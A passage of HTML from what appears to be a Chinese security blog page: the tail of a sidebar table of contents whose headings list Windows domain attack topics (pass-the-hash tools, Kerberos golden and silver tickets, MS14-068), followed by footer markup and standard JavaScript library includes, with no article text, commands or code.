class="nav-number">2.2.2.</span> <span class="nav-text">NTML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NET-NTLM-HASH"><span class="nav-number">2.2.3.</span> <span class="nav-text">NET-NTLM HASH</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#哈希传递-pth"><span class="nav-number">2.3.</span> <span class="nav-text">哈希传递(pth)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#meterpreter"><span class="nav-number">2.3.1.</span> <span class="nav-text">meterpreter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pth-exec"><span class="nav-number">2.3.2.</span> <span class="nav-text">pth-exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">2.3.3.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmiexec"><span class="nav-number">2.3.4.</span> <span class="nav-text">wmiexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Invoke-TheHash"><span class="nav-number">2.3.5.</span> <span class="nav-text">Invoke-TheHash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CrackMapExec"><span class="nav-number">2.3.6.</span> <span class="nav-text">CrackMapExec</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kerberos"><span class="nav-number">2.4.</span> <span class="nav-text">kerberos</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-the-ticket-ptt"><span class="nav-number">2.5.</span> <span class="nav-text">pass-the-ticket(ptt)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#黄金票据-Golden-Ticket"><span class="nav-number">2.5.1.</span> <span class="nav-text">黄金票据(Golden Ticket)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#白银票据-Silver-Ticket"><span class="nav-number">2.5.2.</span> <span class="nav-text">白银票据(Silver Ticket)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#两个票据之间的区别"><span class="nav-number">2.5.3.</span> <span class="nav-text">两个票据之间的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms14-068"><span class="nav-number">2.5.4.</span> <span class="nav-text">ms14-068</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Phyb0x</span>
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  </div>
+
+  
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
